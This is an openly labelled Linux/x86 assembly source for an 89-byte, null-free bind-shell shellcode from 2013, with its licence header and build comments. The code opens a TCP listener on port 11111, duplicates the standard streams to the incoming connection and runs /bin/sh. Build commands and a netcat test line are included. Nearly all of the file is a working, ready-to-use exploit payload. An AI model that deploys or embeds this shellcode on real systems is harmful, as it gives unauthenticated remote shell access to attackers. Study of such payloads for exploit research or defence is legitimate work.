; Shell Bind TCP (GetPC/Call/Ret Method) - Assembly Language
; Linux/x86
;
; Written in 2013 by Geyslan G. Bem, Hacking bits
;
; http://hackingbits.com
; geyslan@gmail.com
;
; This source is licensed under the Creative Commons
; Attribution-ShareAlike 3.0 Brazil License.
;
; To view a copy of this license, visit
;
;   http://creativecommons.org/licenses/by-sa/3.0/
;
; You are free:
;
;    to Share - to copy, distribute and transmit the work
;    to Remix - to adapt the work
;    to make commercial use of the work
;
; Under the following conditions:
;   Attribution - You must attribute the work in the manner
;                 specified by the author or licensor (but
;                 not in any way that suggests that they
;                 endorse you or your use of the work).
;
;   Share Alike - If you alter, transform, or build upon
;                 this work, you may distribute the
;                 resulting work only under the same or
;                 similar license to this one.
;
;
; shell_bind_tcp_getpc
;
; * 89 bytes
; * null-bytes free
; * uses GetPC method for fun and profit
;
;
; # nasm -f elf32 shell_bind_tcp_getpc.asm -o shell_bind_tcp_getpc.o
; # ld -m elf_i386 shell_bind_tcp_getpc.o -o shell_bind_tcp_getpc
; # ./shell_bind_tcp_getpc
;
; Testing
; # nc 127.0.0.1 11111


global _start

section .text

_start:

	call $+4
	ret
	pop ebp

	; opcode value is counted starting in the pop ebp offset until interruption offset
	lea ebp, [ebp+74]

	; Creating the socket file descriptor
	; socket(2, 1, 0)

	xor eax, eax

	cdq
	push 1
	pop ebx
	
	; socket arguments
	push edx
	push ebx
	push 2

	call ebp

	; Biding the socket with an address type
	; bind(sockfd, [2, port, 0], 16)

	xchg esi, eax

	pop ebx

	; sockaddr_in struct
	push edx
	push WORD 0x672b	; port number
	push bx

	mov ecx, esp

	; bind arguments
	push 16
	push ecx
	push esi

	call ebp

	; Preparing to listen the incoming connection (passive socket)
	; listen(sockfd, 0)

	inc ebx
	inc ebx

	push edx
	push esi

	call ebp

	; Accepting the incoming connection
	; accept(sockfd, 0, 0)

	inc ebx

	push edx
	push edx
	push esi

	call ebp

	
	; Creating a interchangeably copy of the 3 file descriptors (stdin, stdout, stderr)
	; dup2 (clientfd, fd)

	xchg eax, ebx
	pop ecx
	
dup_loop:
        mov al, 63
        int 0x80

        dec ecx
        jns dup_loop		; looping (2, 1, 0)

	
	; Finally, using execve to substitute the actual process with /bin/sh
        ; execve("/bin/sh", ["/bin/sh", 0], 0)
        mov al, 11

        push edx
        push 0x68732f2f         ; "//sh"
        push 0x6e69622f         ; "/bin"

        mov ebx, esp
        push edx
        push ebx
	
	jmp final
	

interruption:

	pop edi
	
	push 102
	pop eax

final:	
	mov ecx, esp
	int 0x80
	
	push edi

	ret
